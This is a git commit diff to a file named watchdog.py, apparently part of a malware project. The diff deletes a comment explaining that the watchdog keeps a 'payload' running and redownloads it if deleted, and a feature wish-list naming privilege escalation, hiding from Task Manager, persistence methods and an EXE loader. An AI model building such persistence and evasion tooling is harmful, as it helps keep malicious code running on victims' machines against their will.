0d8d3ae2a868a527f4a4cc06ca67190c0ea67808
H0lyL337 <deadmanwalkingx13@gmail.com>
2022-05-19 05:58:50 -0400

    Update watchdog.py

--- watchdog.py
+++ watchdog.py
@@ -7,33 +7,6 @@ import requests
 import shutil
 import getpass
 
-### The purpose of this watchdog is to make sure that the payload is always running.
-#   If the pay load is not running and is not on the file system because it got deleated 
-#   or somehow, watchdog will redownload and place the payload in the specified directory.
-#   
-# 
-#   
-# 
-#   FEATURES TO ADD:
-#   ________________
-#   Macos support
-#
-#   Stub creator
-#
-#   GUI
-#
-#   Auto-Detect taskmanager and remove self until it is closed.
-#
-#   Privilege Escaltion
-#   
-#   EXE LOADER and executer
-#
-#   Launch python script on the fly
-#
-#   different persistance methods
-#
-
-
 OS = platform.uname()[0]
 
 ### NAME OF PAYLOAD AND WATCHDOG FILES YOU CAN NAME ANYTHING YOU WANT, DO NOT INCLUDE EXTENTIONS EX. .EXE OR .BIN
